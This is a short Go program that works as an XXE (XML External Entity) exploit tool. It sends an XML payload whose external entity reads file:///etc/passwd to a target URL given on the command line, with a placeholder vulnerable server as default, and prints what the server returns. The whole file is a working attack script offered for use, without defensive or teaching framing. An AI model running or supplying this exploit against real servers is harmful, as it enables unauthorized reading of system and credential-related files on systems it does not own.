package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

func main() {

	// Define the URL of the vulnerable server
	url := flag.String("u", "http://vulnerable-server.com/xxe-endpoint", "The url of the vulnerable server")

	// Define the timeout flag
	timeout := flag.Int("t", 30, "The timeout for the HTTP request in seconds")

	// Parse the command line flags
	flag.Parse()

	// Create an XML payload with an XXE injection
	payload := `
		<!DOCTYPE foo [
		<!ELEMENT foo ANY >
		<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<foo>&xxe;</foo>
	`

	// Create a new HTTP client with the specified timeout
	client := &http.Client{
		Timeout: time.Duration(*timeout) * time.Second,
	}

	// Send the payload to the server using an HTTP POST request
	resp, err := client.Post(*url, "application/xml", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		fmt.Println("Error sending payload:", err)
		return
	}

	// Check the response status code
	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Error sending payload: HTTP %d\n", resp.StatusCode)
		return
	}

	// Read the response from the server
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	// Print the response from the server
	fmt.Println(string(body))
}
